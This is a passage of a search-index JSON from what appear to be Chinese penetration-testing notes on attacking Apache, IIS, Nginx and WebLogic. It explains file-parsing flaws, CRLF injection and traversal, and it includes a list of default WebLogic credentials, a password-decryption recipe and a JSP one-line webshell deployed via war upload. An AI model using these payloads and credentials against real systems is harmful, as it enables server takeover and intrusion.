\u76ee\u5f55\u904d\u5386\u5c0f\u6d1e \u76ee\u5f55\u7a7f\u8d8a CRLF\u6ce8\u5165 Nginx \u6587\u4ef6\u540d\u903b\u8f91\u6f0f\u6d1e\uff08CVE-2013-4547\uff09 WebLogic \u5f31\u53e3\u4ee4 \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u57fa\u7840\u4e0a\u7684\u540e\u53f0\u5bc6\u7801\u7834\u89e3 \u540e\u53f0\u4f20\u6728\u9a6c\u63d0\u6743 weblogic uudi\u7ec4\u4ef6\u9020\u6210\u7684\u7aef\u53e3\u63a2\u6d4b Weblogic \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff08CVE-2018-2894\uff09","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#apache","text":"","title":"apache"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#apache_1","text":"\u4e0e\u5176\u8bf4\u8fd9\u662f\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u4e0d\u5982\u8bf4\u8fd9\u662f\u4e00\u4e2a\u7279\u6027\uff0c\u5f88\u591a\u7a0b\u5e8f\u5458\u4e0d\u77e5\u9053\u8fd9\u79cd\u7279\u6027\uff0c\u6240\u4ee5\u4f1a\u5199\u51fa\u6709\u95ee\u9898\u7684\u4ee3\u7801\u3002 \u7279\u6027\uff1a\u591a\u540e\u7f00\u540d(\u5168\u7248\u672c\u90fd\u6709\u8fd9\u4e2a\u7279\u6027\uff09 apache\u5728\u89e3\u6790\u4e00\u4e2a\u6587\u4ef6\u7684\u540e\u7f00\u540d\u65f6\uff0c\u662f\u4ece\u53f3\u5f80\u5de6\u89e3\u6790\u540e\u7f00\u540d\u7684\uff0c\u5982\u679c\u53f3\u8fb9\u7684\u540e\u7f00\u540d\u4e0d\u8ba4\u8bc6\uff0c\u5c31\u4f1a\u7ee7\u7eed\u5411\u5de6\u8bc6\u522b\uff0c\u76f4\u5230\u8bc6\u522b\u5230\u4e00\u4e2a\u8ba4\u8bc6\u7684\u540e\u7f00\u540d\uff0c\u4f46\u662f\u4e07\u4e00\u90fd\u4e0d\u8ba4\u8bc6\u5462?\u90fd\u4e0d\u8ba4\u8bc6\u7684\u8bdd\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662fplain/text\u5904\u7406\u3002\u90a3\u4e48apache\u662f\u600e\u4e48\u77e5\u9053\u54ea\u4e2a\u540e\u7f00\u540d\u5b83\u662f\u8ba4\u8bc6\u7684\u5462?\u7b54\u6848\u662f\u8ba4\u8bc6\u7684\u540e\u7f00\u540d\u4eec\u90fd\u88ab\u8bb0\u5f55\u5230\u4e00\u4e2a\u53ebmime.types\u7684\u6587\u4ef6\u4e2d\u4e86\u3002\u8fd9\u4e2a\u6587\u4ef6\u5462,Windows\u653e\u5728conf\u6587\u4ef6\u5939\u91cc\uff0clinux\u653e\u5728/etc/mime.types\uff08\u4e0d\u4e00\u5b9a\u5728\u8fd9\u91cc\uff0c\u9700\u8981\u81ea\u5df1\u627e\u627e\uff09,\u6253\u5f00\u540e\u662f\u8fd9\u6837 \u5b9a\u4e49\u4e86\u4e0d\u540c\u7684\u540e\u7f00\u540d\u5e94\u8be5\u5411\u6d4f\u89c8\u5668\u8fd4\u56de\u4ec0\u4e48\u6837\u7684mime\u683c\u5f0f\u3002\u8fd9\u91cc\u8981\u8bf4\u7684\u662f\u6709\u4e9b\u60c5\u51b5\u4e0b\u7684mime.types\u6ca1\u6709\u63d0\u4f9b\u5bf9php\u7684\u89e3\u6790\u65b9\u6cd5\uff0c\u5bf9php\u7684\u89e3\u6790\u89c4\u5219\u653e\u5728\u53e6\u4e00\u4e2a\u6587\u4ef6\uff0cWindows\u4e0b\u5728/conf/extra/httpd-php.conf\u3002Linux\u4e5f\u6709\u8fd9\u4e2a\u6587\u4ef6\u5728/etc/apache2/mods-enabled/php7.2.conf\uff08\u6216\u8005\u548cWindows\u7684\u8def\u5f84\u4e00\u6837),\u6253\u5f00\u540e\u662f\u8fd9\u6837\u7684\uff0c\u5b9a\u4e49\u4e86\u6587\u4ef6\u540d\u6ee1\u8db3\u4ec0\u4e48\u6761\u4ef6(\u6b63\u5219\u8868\u8fbe\u5f0f)\u624d\u4f1a\u5c06\u4ed6\u7ed9php\u5904\u7406\u5668\u5904\u7406,\u800c\u4e14\uff0c\u5982\u679c\u4f60mime.types\u91cc\u5339\u914d\u5230\u4e86php\u540e\u7f00\uff0c\u4f46\u8fd9\u4e2a\u5904\u7406\u5668\u5339\u914d\u6587\u4ef6\u6ca1\u6709\u5339\u914d\u6210\u529f\uff0c\u4ed6\u8fd8\u662f\u4e0d\u4f1a\u628aphp\u6587\u4ef6\u8fdb\u884c\u5904\u7406 \u53ef\u4ee5\u8bd5\u4e00\u8bd5\uff0c\u786e\u5b9e\u662f\u8fd9\u6837\u7684,apache\u5bf9\u8fd9\u4e2a\u6587\u4ef6\u7b2c\u4e00\u4e2a\u5339\u914d\u5230\u7684\u540e\u7f00\u540d\u662fjpg\uff0c\u6240\u4ee5\u628a\u5b83\u5f53\u4f5c\u56fe\u7247\u5904\u7406\u4e86\uff0c\u8fd4\u56de\u4e86\u56fe\u7247\u7c7b\u578b\u7684mime\u5934\uff0c\u6d4f\u89c8\u5668\u4e5f\u5c31\u628a\u8fd9\u4e2a\u6587\u4ef6\u5f53\u4f5c\u56fe\u7247\u5904\u7406\uff0c\u4e8e\u662f\u51fa\u73b0\u4e86\u8fd9\u79cd\u60c5\u51b5 \u5f53\u7136\uff0c\u7528\u8fd9\u79cd\u591a\u57df\u540d\u7279\u6027\u53bb\u89e3\u6790php\u6587\u4ef6\u7684\u8bdd\uff0c\u5c31\u9700\u8981\u5728\u4e0a\u6587\u63d0\u5230\u7684\u6587\u4ef6\u91cc\u53bb\u4fee\u6539\u4fee\u6539\u54e6\u3002","title":"apache\u6587\u4ef6\u591a\u540e\u7f00\u540d\u89e3\u6790\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#apache_2","text":"2.4.0\\~2.4.29\u7248\u672c\u4e2d\u5b58\u5728\u4e00\u4e2a\u89e3\u6790\u6f0f\u6d1e\uff0c\u5728\u89e3\u6790PHP\u65f6\uff0c 1.php\\x0A \u5c06\u88ab\u6309\u7167PHP\u540e\u7f00\u8fdb\u884c\u89e3\u6790\uff0c\u5bfc\u81f4\u7ed5\u8fc7\u4e00\u4e9b\u670d\u52a1\u5668\u7684\u5b89\u5168\u7b56\u7565\u3002","title":"apache \u6362\u884c\u7ed5\u8fc7"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#apache-ssissi","text":"\u5982\u679c\u670d\u52a1\u5668\u5f00\u542f\u4e86ssi\u4e0ecgi\u652f\u6301,\u5373\u53ef\u4e0a\u4f20shtml\u6587\u4ef6\u5e76\u5728shtml\u6587\u4ef6\u4e2d\u8f93\u5165ssi\u6307\u4ee4 \\<!\u2013#exec cmd=\u201dpayload\u201d \u2013>\uff0c\u5982 \\<!\u2013#exec cmd=\u201dls\u201d \u2013> ,\u7136\u540e\u518d\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u5373\u53ef\u83b7\u5f97ls\u7684\u7ed3\u679c","title":"apache ssi\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08\u539f\u7406\u548cssi\u6ce8\u5165\u4e00\u6837\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#iis","text":"","title":"iis"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#phpiis775","text":"\u9002\u7528\u7248\u672c iis7/7.5 \u524d\u63d0\u6761\u4ef6: 1.php.ini\u91cc\u7684cgi.fix_pathinfo\u8bbe\u7f6e\u4e3a1,\u4e14\u7ed3\u5408\u65b9\u5f0f\u662ffast-cgi 2.\u5f00\u542fFast-CGI\u8fd0\u884c\u6a21\u5f0f \u4f5c\u7528: \u5728\u8bbf\u95ee\u67d0\u4e2a\u6587\u4ef6\u65f6\uff0c\u5728\u8def\u5f84\u540e\u52a0 / .php(\u8fd9\u91cc\u7684 \u6307\u4efb\u610f\u5b57\u7b26)\uff0c\u5373\u53ef\u8ba9\u670d\u52a1\u5668\u628a\u628a\u8be5\u6587\u4ef6\u5f53\u4f5cphp\u6587\u4ef6\u89e3\u6790\u5e76\u8fd4\u56de \u5982\u56fe\u6211\u5728\u4e00\u4e2atxt\u6587\u4ef6\u4e2d\u5199\u5165php\u4ee3\u7801\uff0c\u8ba9\u540e\u8bbf\u95ee\u5b83\u65f6\u5728\u8def\u5f84\u6700\u540e\u52a0\u4e86/a.php\uff0c\u5b83\u5c31\u88ab\u89e3\u6790\u4e3aphp\u6587\u4ef6\u4e86","title":"\u5173\u4e8e/\u7684php\u89e3\u6790\u6f0f\u6d1e(iis7/7.5\u89e3\u6790\u6f0f\u6d1e)"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#put","text":"1.\u9002\u7528\u7248\u672c iis6.0 2.\u524d\u63d0\u6761\u4ef6:\u670d\u52a1\u5668\u5f00\u542f\u4e86webdav\u670d\u52a1\u5e76\u4e14\u8bbe\u7f6e\u4e86\u5199\u5165\u6743\u9650 \u540c\u65f6\u627e\u5230\u8bbf\u95ee\u7f51\u7ad9\u7684\u7528\u6237\u662f\u54ea\u4e2a\u5e76\u7ed9\u4ed6\u8bfb\u53d6\u548c\u5199\u5165\u6743 3.\u6982\u8ff0\uff1a\u7528PUT\u65b9\u6cd5\u4e0a\u4f20\u6587\u4ef6,\u5e76\u5c1d\u8bd5getshell \u4e0a\u4f20,\u5e76\u4e14\u786e\u5b9e\u4e0a\u4f20\u6210\u529f\uff0c\u4f46\u662f\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u65e0\u6cd5\u4e0a\u4f20php\u7b49\u811a\u672c\u6587\u4ef6 \u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u5c31\u4f1a\u60f3\u5230\u7528move\u65b9\u6cd5\u6765\u5c06txt\u6587\u4ef6\u8f6c\u5316\u4e3aphp\u6587\u4ef6,\u4f46\u76f4\u63a5move\u5f80\u5f80\u662f\u4e0d\u884c\u7684\uff0c\u8981\u7528\u5230iis6.0\u89e3\u6790\u6f0f\u6d1e\uff0c\u628a\u5b83\u5199\u6210shell.php;.txt\u5c31\u53ef\u4ee5\u4e86getshell\u4e86","title":"PUT\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#iis6","text":"iis6.0\u73af\u5883\u4e0b\u4f1a\u628a\u6587\u4ef6\u7578\u5f62\u89e3\u6790: 1.\u5728\u4e00\u4e2a\u6587\u4ef6\u540e\u9762\u52a0;.\u4efb\u610f\u540e\u7f00\u540d\uff1a\u5047\u8bbe\u6709\u4e2a\u6587\u4ef6\u662fa.php\uff0c\u6211\u4eec\u628a\u5b83\u6539\u6210a.php;a.txt\uff0c\u4ed6\u8fd8\u662f\u4f1a\u88ab\u89e3\u6790\u6210php\u6587\u4ef6\u4f46\u662f\u56e0\u4e3a\u540e\u7f00\u540d\u662ftxt\u6240\u4ee5\u4f1a\u7ed5\u8fc7\u4e00\u4e9b\u9632\u62a4 2.\u5728\u4e00\u4e2a\u540d\u4e3a *.php(\u5982a.php)\u7684\u6587\u4ef6\u5939\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u90fd\u4f1a\u88ab\u89e3\u6790\u4e3aphp","title":"iis6\u7578\u5f62\u89e3\u6790\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#nginx","text":"","title":"Nginx"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#iis775","text":"url/xxx.gif/xx.php\u4f1a\u88ab\u89e3\u6790\u4e3aphp\u6587\u4ef6 \u524d\u63d0\u6761\u4ef6:cgi.fix_pathinfo=1","title":"\u2018/\u2019\u5b57\u7b26\u89e3\u6790\u6f0f\u6d1e\uff08\u548ciis7/7.5\u6f0f\u6d1e\u5229\u7528\u65b9\u6cd5\u4e00\u81f4\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_3","text":"\u524d\u63d0\u6761\u4ef6: nginx-conf \u628a\u8fd9\u4e2a\u9009\u9879\u6539\u4e3aon\u5373\u53ef","title":"\u76ee\u5f55\u904d\u5386\u5c0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_4","text":"\u524d\u63d0\u6982\u8981:\u8981\u7528\u5230\u522b\u540dalias \u4f5c\u7528: \u5f53\u8bbe\u7f6e\u522b\u540d\u65f6\uff0clocation\u540e\u9762\u7684\u8def\u5f84\u6ca1\u6709\u7528/\u95ed\u5408\u65f6\uff0c\u5c31\u4f1a\u5f15\u8d77\u8bbf\u95ee url/xx../\u65f6\u8fd4\u56de\u7684\u76ee\u5f55\u662f\u5f53\u524d\u6587\u4ef6\u5939\u7684\u4e0a\u5c42\u76ee\u5f55 \u53ef\u89c1\u8fd4\u56de\u7684\u76ee\u5f55\u662f\u4e0a\u5c42\u76ee\u5f55","title":"\u76ee\u5f55\u7a7f\u8d8a"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#crlf","text":"\u524d\u63d0\u6761\u4ef6\u4e0e\u4ea7\u751f\u539f\u56e0: 1.\u968f\u7740\u4e1a\u52a1\u7684\u53d1\u5c55\uff0c\u6709\u4e9b\u7f51\u7ad9\u4f1a\u628a http://xxx \u91cd\u5b9a\u5411\u4e3a https://xxx \u6216 http://x.com \u91cd\u5b9a\u5411\u4e3a http://www.x.com , \u90a3\u4e48\u8fd9\u79cd\u91cd\u5b9a\u5411\u7684\u539f\u7406\u5728nginx\u4e0a\u7684\u5b9e\u73b0\u65b9\u5f0f\u662f\u5728location\u5757\u91cc\u52a0\u5165return 302 http\\:// $host:81$ uri;\u4e4b\u7c7b\u7684\u8bed\u53e5\uff0c \u8fd9\u91cc\u7684 $host,$ url\u90fd\u662f\u53d8\u91cf\u3002 $host\u4e00\u822c\u4e3a\u8bf7\u6c42\u5934\u7684host\u5934\u90e8,$ url\u4e00\u822c\u4e3a\u8bf7\u6c42\u884c\u91cc\u7684\u8def\u5f84\u90e8\u5206 \u5982 GET /url HTTP/1.1\u6b64\u5904\u7684/url\u90e8\u5206. 2.http\u5934\u90e8\u91cc\uff0c0d\uff08cr\uff09\u548c0a\uff08lf\uff09\u5b57\u7b26\u662f\u7528\u6765\u5206\u5272\u8bf7\u6c42\u5934\u90e8\u533a\u57df\u7684\u5b57\u7b26\u3002\u5934\u90e8\u7684\u884c\u662f\u4ee5\u4e00\u4e2acrlf\u6765\u5206\u5272\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u8bf7\u6c42\u5934\u90e8\u6bcf\u4e2a\u884c\u4e4b\u95f4\u90fd\u5b58\u5728\u7740\u4e00\u4e2acrlf\u5b57\u7b26\u6765\u5206\u5272\u5b83\u4eec\uff0c\u8ba9\u4ed6\u4eec\u6210\u4e3a\u591a\u4e2a\u72ec\u7acb\u7684\u884c\u3002\u5934\u90e8\u4e0ebody\u4e4b\u95f4\u6709\u4e24\u4e2acrlf\u6765\u5206\u5272 \u4f5c\u7528:\u5f53\u67d0\u53f0nginx\u8bbe\u7f6e\u4e86\u5f62\u5982return 302 http\\:// $host:80$ uri; \u8fd9\u79cd\u914d\u7f6e\u65f6\uff0curl\u662f\u6211\u4eec\u5b8c\u5168\u53ef\u63a7\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728url\u4e2d\u4eba\u4e3a\u6784\u9020crlf\u5b57\u7b26\u6765\u5b9e\u73b0\u5206\u884c\uff0c\u4ece\u800c\u5728\u54cd\u5e94\u5934\u4e2d\u6ce8\u5165\u6211\u4eec\u60f3\u8981\u5f97\u5230\u7684\u54cd\u5e94\u5934\u90e8\u3002","title":"CRLF\u6ce8\u5165"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#nginx-cve-2013-4547","text":"Nginx 0.8.41 \\~ 1.4.3 / 1.5.0 \\~ 1.5.7 url/xxxxx.gif%20 \u7684\u6587\u4ef6 \u88ab url/xxxxx.gif%20\\0x00.php (\\0x00\u987b\u5728burp\u91cc\u7684hex\u91cc\u6539) \u9700\u5f00\u542ffastcgi \u7136\u540e\u53d1\u5305\u8bf7\u6c42\u8fd9\u4e2a\u6587\u4ef6,\u5e76\u4e14\u5728\u8bf7\u6c42\u65f6\u505a\u70b9\u624b\u811a","title":"Nginx \u6587\u4ef6\u540d\u903b\u8f91\u6f0f\u6d1e\uff08CVE-2013-4547\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#weblogic","text":"","title":"WebLogic"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_5","text":"User ID system Password password Level Administrator User ID weblogic Password weblogic Level Administrator User ID weblogic Password weblogic User ID admin Password security User ID joe Password password User ID mary Password password User ID system Password security User ID wlcsystem Password wlcsystem User ID wlpisystem Password wlpisystem","title":"\u5f31\u53e3\u4ee4"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_6","text":"\u5047\u8bbe\u6211\u4eec\u80fd\u524d\u53f0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6,\u4f46\u662f\u540e\u53f0\u7684\u8d26\u6237\u5bc6\u7801\u662f\u52a0\u5bc6\u7684.\u5982\u4f55\u7834\u89e3 weblogic\u65b0\u7248\u672c\u7528\u7684\u662fAES\u52a0\u5bc6\uff0c\u8001\u7248\u672c\u7528\u7684\u662f3DES\u52a0\u5bc6 \u90fd\u662f\u5bf9\u79f0\u52a0\u5bc6\uff0c\u6709\u5bc6\u94a5\u5c31\u53ef\u89e3 \u5047\u8bbe\u524d\u53f0\u53ef\u4ee5\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u7528\u5230\u7528\u6237\u7684\u5bc6\u6587\u548c\u52a0\u5bc6\u7684\u5bc6\u94a5\u5373\u53ef\u7834\u89e3\u3002\u8fd9\u4e24\u4e2a\u6587\u4ef6\u5728base_domain\u4e0b, \u4e3a./security/ SerializedSystemIni.dat \u548c config/config.xml \u8fd9\u91cc\u503c\u5f97\u4e00\u63d0\u7684\u662f,.dat\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6,\u5efa\u8baeburp\u6253\u5f00\u4e0d\u7136\u5bb9\u6613\u4e71\u7801 \u628a\u4e8c\u8fdb\u5236\u4fe1\u606fcopy to file\u4fdd\u5b58\u4e0b\u6765. \u83b7\u53d6config.xml xml\u6587\u6863\u91cc\u8fd9\u624d\u662f\u7ba1\u7406\u5458\u8d26\u6237 \u5f00\u59cb\u89e3\u5bc6\uff0c\u8fd9\u91cc\u4f7f\u7528\u7684\u662f https://github.com/TideSec/Decrypt_Weblogic_Password \u4e2d\u7684tools5 \u89e3\u5bc6\u6210\u529f\u3002\u767b\u5f55\u5c31\u5b8c\u4e8b\u4e86","title":"\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u57fa\u7840\u4e0a\u7684\u540e\u53f0\u5bc6\u7801\u7834\u89e3"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_7","text":"\u540e\u53f0\u4f20jsp\u6728\u9a6c\u7684war\u5305\u5c31\u884c\u4e86 \u600e\u4e48\u751f\u6210war\u5305: jar cvf shell.war \u6728\u9a6c\u6e90\u6587\u4ef6 \u90e8\u7f72-\u300b\u5b89\u88c5-\u300b\u4e0a\u8f7d\u6587\u4ef6-\u300b\u9009\u62e9\u6587\u4ef6\u9009\u62e9war\u5305-\u300b\u4e00\u76f4\u4e0b\u4e00\u6b65\u7136\u540e\u5b8c\u6210 \u8bbf\u95eewar\u5305\u76ee\u5f55\u4e0b\u7684\u6728\u9a6c\u6587\u4ef6\u5373\u53ef \u9a6c\u5b50\u662f\u4e00\u53e5\u8bdd\u9a6c\u5b50 <%Runtime.getRuntime.exec(request.getParameter(\u201ccmd\u201d));%> \u547d\u4ee4\u5efa\u8bae\u7528\u8fd9\u4e2a\u7f51\u7ad9\u7f16\u7801\u4e00\u4e0b\uff0c\u4e0d\u7136\u6709\u53ef\u80fd\u4e0d\u4f1a\u6267\u884c http://www.jackson-t.ca/runtime-exec-payloads.html","title":"\u540e\u53f0\u4f20\u6728\u9a6c\u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#weblogic-uudi","text":"\u82e5weblogic\u52a0\u8f7d\u4e86uudi\u7ec4\u4ef6\uff0c\u90a3\u4e48\u5728 /uddiexplorer/SearchPublicRegistries.jsp \u4f1a\u5b58\u5728\u7aef\u53e3\u63a2\u6d4b\u95ee\u9898 \u5bf9\u8be5jsp\u4f20\u53c2 ?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001 \u6211\u4eec\u901a\u8fc7\u6539\u53d8operator\u7684\u7aef\u53e3\u53d1\u5305\uff0c\u770b\u9875\u9762\u53d8\u5316\u5373\u53ef\u7aef\u53e3\u63a2\u6d4b \u7aef\u53e3\u4e0d\u5b58\u5728\uff0c\u5c31\u4f1a\u6709could not connect over HTTP to server: \u5b58\u5728\u5c31\u6709404 error code (Not Found). Please ensure that your URL is correct,","title":"weblogic uudi\u7ec4\u4ef6\u9020\u6210\u7684\u7aef\u53e3\u63a2\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#weblogic-cve-2018-2894","text":"WebLogic\u7ba1\u7406\u7aef\u672a\u6388\u6743\u7684\u4e24\u4e2a\u9875\u9762\u5b58\u5728\u4efb\u610f\u4e0a\u4f20getshell\u6f0f\u6d1e\uff0c\u53ef\u76f4\u63a5\u83b7\u53d6\u6743\u9650\u3002\u4e24\u4e2a\u9875\u9762\u5206\u522b\u4e3a/ws_utc/begin.do\uff0c/ws_utc/config.do 